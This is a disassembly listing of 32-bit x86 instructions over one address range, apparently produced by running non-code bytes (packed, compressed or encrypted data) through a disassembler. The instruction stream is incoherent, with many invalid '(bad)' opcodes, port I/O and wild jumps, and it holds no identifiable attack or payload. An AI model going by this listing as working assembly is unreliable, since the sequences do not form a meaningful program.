  424e87:	test   al,0x5a
  424e89:	aaa    
  424e8a:	or     al,0x83
  424e8c:	xor    eax,0x5f469f1f
  424e91:	pop    ebp
  424e92:	push   0x8
  424e94:	sub    DWORD PTR [eax-0x7a],esi
  424e97:	out    0x49,eax
  424e99:	or     BYTE PTR ds:[ebx],ch
  424e9c:	ins    BYTE PTR es:[edi],dx
  424e9d:	sub    BYTE PTR [esi-0xc7fd9dd],dh
  424ea3:	stc    
  424ea4:	jge    0x424efe
  424ea6:	sahf   
  424ea7:	cmp    dh,BYTE PTR [ecx-0x77]
  424eaa:	ins    DWORD PTR es:[edi],dx
  424eab:	das    
  424eac:	pop    ss
  424ead:	jbe    0x424e64
  424eaf:	leave  
  424eb0:	xchg   ebx,eax
  424eb1:	fisttp WORD PTR [ebp-0x62d4968a]
  424eb7:	fstp   DWORD PTR [edi-0x4c]
  424eba:	into   
  424ebb:	rol    DWORD PTR [edx+edi*4+0x61b71535],1
  424ec2:	mov    al,0x96
  424ec4:	or     ah,BYTE PTR ds:[edx+ecx*2+0x6cade2a9]
  424ecc:	mov    cl,0xb
  424ece:	add    bl,BYTE PTR [eax-0x49a04b4b]
  424ed4:	aas    
  424ed5:	pop    edx
  424ed6:	stos   BYTE PTR es:[edi],al
  424ed7:	test   DWORD PTR [ebx+eax*2],eax
  424eda:	sahf   
  424edb:	mov    WORD PTR [edx],?
  424edd:	test   eax,0x50b48f39
  424ee2:	pop    ss
  424ee3:	add    DWORD PTR [edi-0xb],esp
  424ee6:	cwde   
  424ee7:	ins    BYTE PTR es:[edi],dx
  424ee8:	cs sub ch,0xb6
  424eec:	lods   eax,DWORD PTR ds:[esi]
  424eed:	and    esi,DWORD PTR [esi+0x55478710]
  424ef3:	sub    esp,DWORD PTR [ebp+0x5ddb6c6a]
  424ef9:	push   eax
  424efa:	sbb    eax,0x3c071aa1
  424eff:	jp     0x424f38
  424f01:	sbb    cl,BYTE PTR [eax-0x5c675892]
  424f07:	ret    
  424f08:	pop    ebp
  424f09:	nop
  424f0a:	pushf  
  424f0b:	sub    DWORD PTR [ebp+0x2],ebp
  424f0e:	call   0xd070:0xfd886568
  424f15:	cmp    al,BYTE PTR [ebp+0x47]
  424f18:	jno    0x424ec5
  424f1a:	ficom  DWORD PTR [edx+0x69]
  424f1d:	shl    dl,1
  424f1f:	pop    esi
  424f20:	dec    ebp
  424f21:	adc    al,0xb7
  424f23:	push   esi
  424f24:	dec    ebx
  424f25:	ds cmp eax,0xd37efc5
  424f2b:	inc    ebp
  424f2c:	dec    ebx
  424f2d:	push   esp
  424f2e:	(bad)  
  424f2f:	fcom   QWORD PTR [ebp+0x6ed4b63d]
  424f35:	mov    ch,0x85
  424f37:	cmc    
  424f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f39:	jno    0x424f6c
  424f3b:	outs   dx,BYTE PTR ds:[esi]
  424f3c:	frstor [edx+0x62]
  424f3f:	add    DWORD PTR [ebx],ecx
  424f41:	sbb    ebx,ebx
  424f43:	fisttp QWORD PTR [ecx-0x1754a820]
  424f49:	adc    DWORD PTR [eax],0x96b5575b
  424f4f:	ror    DWORD PTR [edx+0x59],1
  424f52:	adc    DWORD PTR [eax+0x5c],ebx
  424f55:	ficom  DWORD PTR [esi-0x21c61e6]
  424f5b:	sbb    DWORD PTR [esi],0x56
  424f5e:	xchg   edi,eax
  424f5f:	xchg   DWORD PTR [ebp+0x43107540],ebp
  424f65:	inc    eax
  424f66:	jne    0x424fc4
  424f68:	inc    esp
  424f69:	fcom   QWORD PTR [esi+0x29ddc4ca]
  424f6f:	repnz add eax,0x6eaa9967
  424f75:	xchg   ebp,eax
  424f76:	jbe    0x424fe8
  424f78:	push   esp
  424f79:	aas    
  424f7a:	fnstsw WORD PTR [edi+0x46]
  424f7d:	push   ss
  424f7e:	je     0x424fdb
  424f80:	fcomp  DWORD PTR [edx+0x585cdc56]
  424f86:	popf   
  424f87:	ror    bl,cl
  424f89:	jg     0x424ff3
  424f8b:	mov    cl,0xb0
  424f8d:	aam    0x15
  424f8f:	and    eax,0x3abc7a9e
  424f94:	out    dx,al
  424f95:	mov    al,0xb5
  424f97:	mov    cl,0xb4
  424f99:	rep outs dx,DWORD PTR ds:[esi]
  424f9b:	or     BYTE PTR [ebx-0x48cb8b13],0xb6
  424fa2:	int    0x54
  424fa4:	mov    edx,0x20828d10
  424fa9:	pop    ss
  424faa:	repnz xchg ebx,eax
  424fac:	jge    0x425017
  424fae:	pop    esp
  424faf:	jb     0x424f81
  424fb1:	add    dh,bl
  424fb3:	inc    ecx
  424fb4:	out    dx,eax
  424fb5:	pop    edi
  424fb6:	jno    0x424fcd
  424fb8:	ins    BYTE PTR es:[edi],dx
  424fb9:	lods   eax,DWORD PTR ds:[esi]
  424fba:	cmovle ecx,DWORD PTR [ebp+0x67b0d9e5]
  424fc1:	mov    dh,0x35
  424fc3:	push   ebp
  424fc4:	sub    al,0x5c
  424fc6:	mov    al,ds:0xbf298fcd
  424fcb:	xor    eax,0xedb52e14
  424fd0:	and    al,bh
  424fd2:	into   
  424fd3:	inc    edx
  424fd4:	mov    dh,0x32
  424fd6:	mov    esi,0xa6aa39b
  424fdb:	outs   dx,BYTE PTR ds:[esi]
  424fdc:	sub    al,0x82
  424fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fdf:	or     DWORD PTR [esi],esp
  424fe1:	int3   
  424fe2:	mov    ch,BYTE PTR [ecx+0x40]
  424fe5:	fwait
  424fe6:	pusha  
  424fe7:	or     DWORD PTR [edi+0xf3c3ed6],esi
  424fed:	cld    
  424fee:	test   DWORD PTR [ebx],ebx
  424ff0:	sbb    eax,0x419606e2
  424ff5:	push   cs
  424ff6:	(bad)  
  424ff8:	add    dh,ah
  424ffa:	sub    BYTE PTR [eax],al
  424ffc:	jnp    0x42501a
  424ffe:	aam    0xd6
  425000:	mov    al,0x87
  425002:	inc    esi
  425003:	out    0x53,eax
  425005:	lahf   
  425006:	sub    al,0x84
  425008:	fist   DWORD PTR [esi]
  42500a:	sub    al,BYTE PTR [edx-0x2b]
  42500d:	xlat   BYTE PTR ds:[ebx]
  42500e:	sub    bh,BYTE PTR [eax]
  425010:	je     0x42507d
  425012:	mov    bh,0x46
  425014:	mov    ebx,DWORD PTR [ecx-0x2c]
  425017:	mov    cl,0xc8
  425019:	(bad)  
  42501a:	out    dx,al
  42501b:	fisub  DWORD PTR [eax]
  42501d:	fadd   DWORD PTR [ecx-0x4c]
  425020:	cmp    BYTE PTR [edx-0x5c],ah
  425023:	mov    ebx,0x11760acc
  425028:	ins    BYTE PTR es:[edi],dx
  425029:	enter  0x2bcf,0xd7
  42502d:	and    al,0x1d
  42502f:	push   edx
  425030:	push   edi
  425031:	aad    0x86
  425033:	fst    st(4)
  425035:	jge    0x424fd7
  425037:	xor    DWORD PTR [eax-0x17449396],esi
  42503d:	push   0xc60c62d9
  425042:	into   
  425043:	and    DWORD PTR [eax+0x6d],edi
  425046:	or     ebx,DWORD PTR [ebx+0x29]
  425049:	xchg   ebp,eax
  42504a:	push   0x65483421
  42504f:	mov    al,0x2c
  425051:	adc    BYTE PTR [ebp+0x7bf8d40b],dh
  425057:	lods   eax,DWORD PTR ds:[esi]
  425058:	fsubr  DWORD PTR [eax+0x2b568a3a]
  42505e:	popf   
  42505f:	cmp    esi,DWORD PTR [ecx+0x2f]
  425062:	retf   0xb820
  425065:	push   eax
  425066:	mov    bl,ch
  425068:	mov    esi,0x144dfedc
  42506d:	pop    ss
  42506e:	mov    edx,0x903d9b0b
  425073:	pop    edx
  425074:	mov    WORD PTR [edi+0x6c51b6da],?
  42507a:	jmp    0xe6dcd083
  42507f:	jmp    0x57446849
  425084:	fst    QWORD PTR [ecx]
  425086:	sahf   
  425087:	sub    BYTE PTR ds:[eax],bl
  42508a:	mov    al,0x69
  42508c:	lds    esi,FWORD PTR [esi+0x69]
  42508f:	imul   ecx,DWORD PTR [ecx-0x3b5b3dec],0xffffffb2
  425096:	lds    ebp,FWORD PTR [ebx]
  425098:	push   es
  425099:	or     BYTE PTR [ebx],0x1d
  42509c:	pop    esp
  42509d:	push   ecx
  42509e:	mov    dl,0xae
  4250a0:	popa   
  4250a1:	repnz push edx
  4250a3:	fild   DWORD PTR [eax]
  4250a5:	(bad)  
  4250a7:	not    BYTE PTR [ebp+0x1a40e5d4]
  4250ad:	cwde   
  4250ae:	fwait
  4250af:	adc    ebp,ebx
  4250b1:	sub    ch,dl
  4250b3:	jb     0x42503e
  4250b5:	or     al,0x74
  4250b7:	imul   ebx,eax,0x6a
  4250ba:	add    BYTE PTR ds:0xdee8de5,dh
  4250c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250c1:	add    BYTE PTR [esi+0x55],dh
  4250c4:	fdiv   QWORD PTR [eax]
  4250c6:	into   
  4250c7:	f2xm1  
  4250c9:	cld    
  4250ca:	sub    DWORD PTR [ebx+0x4d],ebx
  4250cd:	add    esp,ebp
  4250cf:	imul   eax,ebx,0xffffffc8
  4250d2:	imul   edi,ebx,0x605cb7cd
  4250d8:	imul   esp,DWORD PTR [eax+0x4d864737],0x4c
  4250df:	aad    0xb6
  4250e1:	pop    ecx
  4250e2:	retf   
  4250e3:	test   DWORD PTR [esi-0x21ffd341],edx
  4250e9:	cli    
  4250ea:	add    bh,ch
  4250ec:	cmp    eax,0xdbcc7d02
  4250f1:	push   0xffffffbb
  4250f3:	xor    eax,0x3bfb0e40
  4250f8:	jo     0x4250cd
  4250fa:	loopne 0x425178
  4250fc:	mov    ch,0xb
  4250fe:	or     eax,0x1cd057a6
  425103:	push   ebp
  425104:	xchg   esp,eax
  425105:	xor    BYTE PTR [edi],dl
  425107:	inc    esi
  425108:	mov    ch,0xd4
  42510a:	outs   dx,BYTE PTR ds:[esi]
  42510b:	adc    BYTE PTR [ecx-0x38e85516],ch
  425111:	call   0xdb1ffedd
  425116:	stos   BYTE PTR es:[edi],al
  425117:	push   0xe0c33c98
  42511c:	dec    ebp
  42511d:	adc    al,0xf4
  42511f:	imul   BYTE PTR [esi]
  425121:	call   0x59b22c2c
  425126:	sahf   
  425127:	out    dx,eax
  425128:	xor    cl,BYTE PTR ds:[ecx-0x727a7a26]
  42512f:	icebp  
  425130:	inc    edx
  425131:	push   cs
  425132:	add    DWORD PTR ds:0xb955e97,edx
  425138:	push   ebp
  425139:	xor    al,0x41
  42513b:	fmul   QWORD PTR [eax]
  42513d:	out    0xb7,al
  42513f:	inc    esi
  425140:	sbb    eax,0x6db6858d
  425145:	pop    edx
  425146:	jbe    0x425146
  425148:	mov    ebp,0x57915235
  42514d:	je     0x4251ba
  42514f:	mov    bh,0xa5
  425151:	jmp    0x4250fa
  425153:	xchg   ebx,eax
  425154:	dec    ebp
  425155:	mov    bl,0xa4
  425157:	clc    
  425158:	mov    DWORD PTR [ebx],eax
  42515a:	add    DWORD PTR [ebp+0x50],eax
  42515d:	fadd   DWORD PTR [ecx-0x2]
  425160:	or     al,0xb
  425162:	ins    DWORD PTR es:[edi],dx
  425163:	push   edi
  425164:	rol    edx,0xb6
  425167:	cmc    
  425168:	jb     0x4250ff
  42516a:	les    esp,FWORD PTR [ecx-0x5b]
  42516d:	mov    dl,0x11
  42516f:	pop    ss
  425170:	or     al,BYTE PTR [ebx+ecx*2+0x7]
  425174:	xor    al,0x4f
  425176:	(bad)  [ebx]
  425178:	fcmovnb st,st(6)
  42517a:	(bad)  
  42517b:	inc    esp
  42517c:	sbb    DWORD PTR ds:0x5d027b6,0x828ea2
  425186:	mov    eax,0x2be66ed1
  42518b:	out    dx,al
  42518c:	pop    ecx
  42518d:	out    0x76,eax
  42518f:	sbb    bh,BYTE PTR [edx-0x5413a04b]
  425195:	(bad)  
  425196:	dec    ebp
  425197:	push   ds
  425198:	cli    
  425199:	and    dl,BYTE PTR [eax*1-0x49e91ade]
  4251a0:	xchg   BYTE PTR [edx],ah
  4251a2:	or     ebx,ebp
  4251a4:	mov    DWORD PTR [edx+0x2c2d3279],ebx
  4251aa:	cmp    eax,ebx
  4251ac:	cmp    al,0xec
  4251af:	jge    0x4251f1
  4251b1:	or     BYTE PTR cs:0xc5b1b06c,ch
  4251b8:	iret   
  4251b9:	xchg   ebx,eax
  4251ba:	imul   BYTE PTR [ebp-0x151692db]
  4251c0:	add    BYTE PTR [edx+0x58aabcb0],bh
  4251c6:	repnz xor al,0xf7
  4251c9:	jae    0x4251eb
  4251cb:	fcomp  DWORD PTR [eax-0x60]
  4251ce:	inc    esp
  4251cf:	cmp    esp,ecx
  4251d1:	sahf   
  4251d2:	dec    ebp
  4251d3:	inc    ecx
  4251d4:	xchg   edi,eax
  4251d5:	cmp    cl,BYTE PTR [edx]
  4251d7:	and    al,0x8c
  4251d9:	pop    esp
  4251da:	xlat   BYTE PTR ds:[ebx]
  4251db:	adc    al,0xed
  4251dd:	ins    DWORD PTR es:[edi],dx
  4251de:	popa   
  4251df:	mov    ds:0x411e8f54,eax
  4251e4:	sbb    DWORD PTR [ebp+0x742ed26],ebx
  4251ea:	shr    DWORD PTR [eax-0xbfd1983],1
  4251f0:	ja     0x4251bb
  4251f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f3:	(bad)  
  4251f4:	push   eax
  4251f5:	or     edx,DWORD PTR [ebp+0x31]
  4251f8:	push   ebx
  4251f9:	jae    0x425264
  4251fb:	sub    al,0x44
  4251fd:	aam    0xba
  4251ff:	shl    eax,0xaa
  425202:	push   eax
  425203:	xchg   ecx,eax
  425204:	sbb    al,0xb5
  425206:	sub    eax,0xc6d84f6c
  42520b:	lds    esi,FWORD PTR [edx-0x52c1d330]
  425211:	fisttp DWORD PTR [edx+0x44]
  425214:	mov    ebx,0x62e87cd0
  425219:	mov    ecx,0x88591841
  42521e:	lea    ebp,[ebp+0x63]
  425221:	or     al,0xff
  425223:	jns    0x425227
  425225:	add    DWORD PTR [esi+edi*1],esp
  425228:	pop    ebp
  425229:	adc    al,0x1d
  42522b:	mov    ch,0xa3
  42522d:	retf   0x6184
  425230:	sub    al,0xa0
  425233:	mov    dh,0xad
  425235:	jle    0x425259
  425237:	sti    
  425238:	enter  0x147a,0xb4
  42523c:	(bad)  
  42523d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42523e:	jbe    0x42529b
  425240:	cmp    cl,al
  425242:	or     eax,DWORD PTR [ebx+0x6c983b66]
  425248:	and    al,0x87
  42524a:	sbb    esi,esp
  42524c:	rcl    dl,1
  42524e:	dec    edx
  42524f:	pop    esp
  425250:	js     0x4251e4
  425252:	sbb    BYTE PTR [ebx+0x36],0xd2
  425256:	mov    dh,0xd4
  425258:	inc    ecx
  425259:	jl     0x425298
  42525b:	cmp    edi,ebp
  42525d:	out    0xb5,al
  42525f:	enter  0x7001,0x79
  425263:	jmp    0x692b852a
  425268:	add    BYTE PTR [edi],dl
  42526a:	xchg   edx,eax
  42526b:	add    al,0x52
  42526d:	mov    ch,0x45
  42526f:	fcmovne st,st(1)
  425271:	push   edi
  425272:	pop    es
  425273:	lods   eax,DWORD PTR ds:[esi]
  425274:	push   bx
  425276:	push   ecx
  425277:	imul   esp,DWORD PTR [ebx-0x5a704923],0xffffffbf
  42527e:	gs xchg ebx,eax
  425280:	ret    0x16ba
  425283:	ins    DWORD PTR es:[edi],dx
  425284:	sub    DWORD PTR [eax-0x7f],0x6d
  425288:	and    BYTE PTR [ebx],cl
  42528a:	mov    cl,0x45
  42528c:	adc    esi,DWORD PTR [ebx+0x6daa06aa]
  425292:	mov    ds:0x2f08306b,al
  425297:	inc    esi
  425298:	pop    ecx
  425299:	loop   0x4252f1
  42529b:	xor    DWORD PTR [esi+0x14700a1b],0x15
  4252a2:	pop    ss
  4252a3:	lds    edx,FWORD PTR [esi-0x3b]
  4252a6:	mov    bh,0x0
  4252a8:	pushf  
  4252a9:	push   0x76
  4252ab:	test   eax,0xb33e6a23
  4252b0:	or     edx,DWORD PTR [eax+esi*4+0x62]
  4252b4:	std    
  4252b5:	das    
  4252b6:	mov    eax,ds:0x77b696dd
  4252bb:	(bad)  
  4252bc:	(bad)  
  4252be:	rcr    edi,1
  4252c0:	mov    ecx,0x96df01e3
  4252c5:	lods   eax,DWORD PTR ds:[esi]
  4252c6:	je     0x4252cc
  4252c8:	daa    
  4252c9:	sti    
  4252ca:	out    0x6,al
  4252cc:	je     0x4252d0
  4252ce:	neg    DWORD PTR [esi-0x525a8800]
  4252d4:	and    DWORD PTR [esi],ebp
  4252d6:	jp     0x425346
  4252d8:	dec    eax
  4252d9:	pop    eax
  4252da:	lods   eax,DWORD PTR ds:[esi]
  4252db:	pusha  
  4252dc:	xchg   BYTE PTR [edi+esi*4-0x7b],al
  4252e0:	(bad)  
  4252e1:	(bad)
  4252e4:	mov    al,ds:0xedcfe38f
  4252e9:	ins    DWORD PTR es:[edi],dx
  4252ea:	imul   eax,DWORD PTR [eax+0x4fad4036],0x65
  4252f1:	scas   eax,DWORD PTR es:[edi]
  4252f2:	mov    al,0x1d
  4252f4:	fld    QWORD PTR [eax+0x6d]
  4252f7:	fild   DWORD PTR [ebp-0x5b1d2f97]
  4252fd:	ret    0xaa5a
  425300:	push   eax
  425301:	mov    ds:0xbb361404,eax
  425306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425307:	adc    DWORD PTR [esi+0x13],ebx
  42530a:	int3   
  42530b:	or     ebp,DWORD PTR [ebp+0x2d]
  42530e:	push   0xba9e11c7
  425313:	mov    al,0x36
  425315:	dec    ebx
  425316:	adc    BYTE PTR [edi-0x7e107992],ah
  42531c:	and    edi,eax
  42531e:	fdiv   DWORD PTR [eax+0x1cb52e8b]
  425324:	fisubr DWORD PTR [esp+eiz*8]
  425327:	mov    ds:0xe27298f2,eax
  42532c:	mov    dh,0x75
  42532e:	push   ebp
  42532f:	pop    DWORD PTR [esi+0x3e]
  425332:	out    0x20,eax
  425334:	dec    esi
  425335:	inc    BYTE PTR [edx-0x476569fb]
  42533b:	mov    ebx,0xa3d8e63b
  425340:	mov    eax,0x640da56d
  425345:	push   ecx
  425346:	push   esi
  425347:	jp     0x42539f
  425349:	adc    DWORD PTR [edx-0x57992d4a],0x9
  425350:	inc    esi
  425351:	sbb    DWORD PTR ds:0x2749617,0x45c0ba5a
  42535b:	in     eax,dx
  42535c:	repz add edx,DWORD PTR [edx+0x4e]
  425360:	fsub   DWORD PTR [eax+0x2f4aeb70]
  425366:	out    0x12,al
  425368:	dec    esp
  425369:	xchg   ecx,eax
  42536a:	xchg   edx,eax
  42536b:	(bad)  
  42536d:	mov    dh,0xd0
  42536f:	add    BYTE PTR [ecx-0x2a5eac87],0x8c
  425376:	pop    ss
  425377:	lods   eax,DWORD PTR ds:[esi]
  425378:	dec    ebx
  425379:	sbb    ecx,DWORD PTR [ebx-0x32]
  42537c:	or     al,BYTE PTR [eax]
  42537e:	inc    esp
  42537f:	imul   edi,DWORD PTR [ebp+0x2a5bfa13],0x6c
  425386:	inc    eax
  425387:	jg     0x4253dd
  425389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42538a:	cmc    
  42538b:	pop    edx
  42538c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42538d:	sub    esp,DWORD PTR [edx-0x55]
  425390:	pusha  
  425391:	xor    ebx,edi
  425393:	ds pop esp
  425395:	mov    al,0xdd
  425397:	pusha  
  425398:	test   eax,0xd78c4d9c
  42539d:	push   ebp
  42539e:	test   DWORD PTR [eax+0x76d6ed32],eax
  4253a4:	add    al,0x1
  4253a6:	out    dx,al
  4253a7:	sbb    cl,BYTE PTR cs:[eax]
  4253aa:	mov    ch,0x4a
  4253ac:	ret    0x2edb
  4253af:	xchg   ebp,eax
  4253b0:	lods   eax,DWORD PTR ds:[esi]
  4253b1:	mov    dh,0x9d
  4253b3:	push   esp
  4253b4:	das    
  4253b5:	xchg   esp,eax
  4253b6:	pop    ebx
  4253b7:	mov    ecx,0x6c171b8
  4253bc:	loop   0x425400
  4253be:	cli    
  4253bf:	mov    dl,0x8f
  4253c1:	push   edx
  4253c2:	mov    ebp,0x5b6c6d56
  4253c7:	pop    es
  4253c8:	xchg   ecx,eax
  4253c9:	cmp    al,0x35
  4253cb:	rol    DWORD PTR [esi-0x2926036e],1
  4253d1:	sbb    cl,BYTE PTR [edx]
  4253d3:	test   al,0xb6
  4253d5:	dec    ebp
  4253d6:	bound  edx,QWORD PTR [ebp-0x4b9127b0]
  4253dc:	in     eax,dx
  4253dd:	es (bad) 
  4253df:	enter  0x3ec7,0x9f
  4253e3:	(bad)  
  4253e4:	cmp    ebp,eax
  4253e6:	mov    dl,0x76
  4253e8:	pop    ebx
  4253e9:	call   0xb2b5e218
  4253ee:	cmp    BYTE PTR [ebp+0x1a],bh
  4253f1:	or     DWORD PTR [edi],ebx
  4253f3:	pop    ebp
  4253f4:	ficomp DWORD PTR [edx]
  4253f6:	mov    bh,0x29
  4253f8:	int3   
  4253f9:	mov    esi,0x86255027
  4253fe:	sub    al,0xc6
  425400:	mov    eax,ds:0x86a02575
  425405:	pop    eax
  425406:	inc    esp
  425407:	int    0x89
  425409:	dec    ecx
  42540a:	sbb    eax,0x27685d5
  42540f:	cli    
  425410:	clc    
  425411:	and    bh,BYTE PTR [ebp+0x1d]
  425414:	mov    BYTE PTR [esi],dh
  425416:	fcomp  DWORD PTR [edx-0x60]
  425419:	adc    al,0x55
  42541b:	shr    BYTE PTR ds:0xc0bba2a6,0xc6
  425422:	out    0xf0,al
  425424:	adc    DWORD PTR [ebx],ecx
  425426:	jne    0x42548e
  425428:	pop    ebp
  425429:	lahf   
  42542a:	(bad)  
  42542b:	rol    DWORD PTR [ebx],1
  42542d:	fdivr  st,st(0)
  42542f:	pusha  
  425430:	add    dh,BYTE PTR ds:0xc1e7
  425435:	out    0x2d,al
  425437:	sub    al,0x6c
  425439:	pop    ebx
  42543a:	jp     0x4253d8
  42543c:	outs   dx,BYTE PTR ds:[esi]
  42543d:	push   esp
  42543e:	cmp    cl,BYTE PTR [ebx-0x2e456ed2]
  425444:	outs   dx,BYTE PTR ds:[esi]
  425445:	ins    BYTE PTR es:[edi],dx
  425446:	retf   0x18f2
  425449:	cli    
  42544a:	pop    edx
  42544b:	xchg   ebp,eax
  42544c:	and    DWORD PTR [edi],eax
  42544e:	push   0x2d
  425450:	outs   dx,DWORD PTR ds:[esi]
  425451:	ins    BYTE PTR es:[edi],dx
  425452:	mov    dl,BYTE PTR [ebx]
  425454:	rol    dh,1
  425456:	mov    bh,0xbf
  425458:	add    ch,cl
  42545a:	or     al,0xa8
  42545c:	pop    ebx
  42545d:	mov    ebx,0xc1fbddb0
  425462:	fcom   QWORD PTR [esp+ebx*2+0xb4a1844]
  425469:	or     eax,0xf7ff1b41
  42546e:	outs   dx,DWORD PTR ds:[esi]
  42546f:	lods   al,BYTE PTR ds:[esi]
  425470:	mov    eax,0x1b858edf
  425475:	xchg   esp,eax
  425476:	test   ebp,edi
  425478:	mov    ds:0x3f5d7d91,eax
  42547d:	pop    ebx
  42547e:	adc    DWORD PTR [ebx],ebx
  425480:	shr    DWORD PTR [esi+0x17],1
  425483:	mov    esp,0x98b0da4e
  425488:	mov    BYTE PTR [edx-0x45],0x35
  42548c:	xchg   edx,eax
  42548d:	push   es
  42548e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42548f:	or     dl,ch
  425491:	ja     0x425460
  425493:	xchg   ebp,eax
  425494:	iret   
  425495:	inc    ecx
  425496:	mov    al,0x2b
  425498:	call   0x81860b8e
  42549d:	fcmovnbe st,st(2)
  4254a0:	mov    dh,0xd0
  4254a2:	fsubr  st(1),st
  4254a4:	pop    ds
  4254a5:	popf   
  4254a6:	(bad)  
  4254a7:	(bad)  [ecx-0x5afafd21]
  4254ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254ae:	or     ch,BYTE PTR [esi+0x1d]
  4254b1:	jmp    0xd7c7be3d
  4254b6:	adc    BYTE PTR [edi],dh
  4254b8:	mov    dh,0xad
  4254ba:	jbe    0x4254d8
  4254bc:	lods   al,BYTE PTR ds:[esi]
  4254bd:	or     bh,dh
  4254bf:	data16 ins BYTE PTR es:[edi],dx
  4254c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254c2:	pop    ebx
  4254c3:	(bad)  [esi+0x583d8a5d]
  4254c9:	dec    edx
  4254ca:	in     eax,dx
  4254cb:	pop    ecx
  4254cc:	int3   
  4254cd:	out    dx,eax
  4254ce:	sbb    ch,BYTE PTR [edx+0x25]
  4254d1:	test   al,0x45
  4254d3:	dec    ebx
  4254d4:	or     BYTE PTR [eax],ch
  4254d6:	xchg   BYTE PTR [eax],al
  4254d8:	dec    ebp
  4254d9:	les    esi,FWORD PTR [esi+0x17b21d54]
  4254df:	out    dx,eax
  4254e0:	jmp    0xd7195154
  4254e5:	add    bh,BYTE PTR [eax+0x47]
  4254e8:	pop    es
  4254e9:	les    ebx,FWORD PTR [edx+0x6c00063c]
  4254ef:	(bad)  
  4254f0:	lea    esi,[esi+0x69]
  4254f3:	mov    ds:0xdbb0909c,eax
  4254f8:	inc    edi
  4254f9:	aam    0xf0
  4254fb:	loopne 0x4254c3
  4254fd:	shl    dl,cl
  4254ff:	(bad)  
  425500:	clc    
  425501:	add    BYTE PTR [eax+0x547aaaef],ah
  425507:	(bad)  
  425508:	jo     0x42550a
  42550a:	mov    bh,0xad
  42550c:	sub    ecx,DWORD PTR [ebx+eax*1]
  42550f:	xchg   edx,eax
  425510:	push   edx
  425511:	cmc    
  425512:	and    eax,0x3097190
  425517:	dec    ebp
  425518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425519:	lods   al,BYTE PTR ds:[esi]
  42551a:	push   es
  42551b:	mov    ds:0x25dad163,eax
  425520:	and    dl,BYTE PTR [ebx+0x40]
  425523:	cmp    dh,BYTE PTR [eax+edx*1+0x38]
  425527:	sbb    al,BYTE PTR [ecx-0x73]
  42552a:	push   es
  42552b:	aas    
  42552c:	sbb    DWORD PTR [ebp+0x4aa8359c],esp
  425532:	pop    ss
  425533:	sbb    al,0xe
  425535:	jno    0x425514
  425537:	aaa    
  425538:	inc    esp
  425539:	(bad)  [esi-0x89c9150]
  42553f:	jle    0x4254ee
  425541:	cmp    DWORD PTR [edi-0x1],eax
  425544:	ins    DWORD PTR es:[edi],dx
  425545:	pop    ss
  425546:	mov    dh,0xb6
  425548:	mov    cl,0xf5
  42554a:	enter  0xa70e,0x85
  42554e:	jo     0x4254e7
  425550:	mov    edi,0x17634236
  425555:	mov    cl,0x8c
  425557:	loope  0x42556f
  425559:	rcl    BYTE PTR [esi-0x569d50c7],cl
  42555f:	test   eax,0xecd25eea
  425564:	mov    DWORD PTR [ecx+0x4d],ebx
  425567:	mov    ds:0x1ee6c5d5,al
  42556c:	loopne 0x42556d
  42556e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42556f:	and    eax,0x5b68a6c1
  425574:	call   0x565b9b09
  425579:	into   
  42557a:	adc    DWORD PTR [ecx],0xb602146d
  425580:	pop    ss
  425581:	sub    DWORD PTR [esi+0x4b],edi
  425584:	in     al,0x20
  425586:	xchg   esi,eax
  425587:	dec    edx
  425588:	inc    esp
  425589:	mov    ebx,0xcecf6f5f
  42558e:	xor    dl,BYTE PTR [ebx+0x72]
  425591:	mov    bh,0xb6
  425593:	ss push ss
  425595:	retf   0xfa9
  425598:	test   al,0xdc
  42559a:	out    0xc4,eax
  42559c:	scas   al,BYTE PTR es:[edi]
  42559d:	ret    
  42559e:	test   DWORD PTR ds:0xacd76c11,ecx
  4255a4:	(bad)  
  4255a6:	push   ecx
  4255a7:	loop   0x4255fd
  4255a9:	mov    edx,0x9b0a95b1
  4255ae:	adc    BYTE PTR ds:0x53cee08e,ch
  4255b4:	add    BYTE PTR [edi],dh
  4255b6:	dec    edx
  4255b7:	dec    eax
  4255b8:	inc    ebp
  4255b9:	sar    edx,cl
  4255bb:	sub    ah,BYTE PTR [ecx-0x139c1c93]
  4255c1:	jbe    0x4255f3
  4255c3:	lds    ebp,FWORD PTR [edx]
  4255c5:	enter  0xbac8,0xad
  4255c9:	pusha  
  4255ca:	inc    edi
  4255cb:	lds    ebp,FWORD PTR [ebp+0x15]
  4255ce:	push   cs
  4255cf:	fistp  QWORD PTR [edx+eax*1+0x24]
  4255d3:	and    al,0x5b
  4255d5:	paddsw mm1,QWORD PTR [eax]
  4255d8:	test   eax,0xa41a9bde
  4255dd:	cs shl al,1
  4255e0:	push   esi
  4255e1:	fsubr  DWORD PTR [esi+0x2]
  4255e4:	cmp    eax,0x2e43cea2
  4255e9:	pop    ecx
  4255ea:	xor    DWORD PTR [edx+0x206da16b],esi
  4255f0:	dec    edi
  4255f1:	or     ebx,DWORD PTR [ecx-0xb0d415f]
  4255f7:	fild   DWORD PTR [ebp-0x40]
  4255fa:	jbe    0x4255eb
  4255fc:	in     eax,0x7d
  4255fe:	loope  0x42565e
  425600:	inc    esp
  425601:	pop    ecx
  425602:	push   ebx
  425603:	test   al,0xb8
  425605:	ins    DWORD PTR es:[edi],dx
  425606:	pop    ebx
  425607:	sahf   
  425608:	jg     0x4255d8
  42560a:	or     eax,DWORD PTR ds:0x7608a1a
  425610:	mov    al,0x6d
  425612:	dec    esi
  425613:	jnp    0x425632
  425615:	adc    al,0x4d
  425617:	cwde   
  425618:	mov    al,0xbf
  42561a:	mov    dh,0x2d
  42561c:	mov    eax,0x4d682a7a
  425621:	ins    DWORD PTR es:[edi],dx
  425622:	ds stos BYTE PTR es:[edi],al
  425624:	jne    0x42567f
  425626:	sub    BYTE PTR [eax-0x1d],ah
  425629:	ret    0x6190
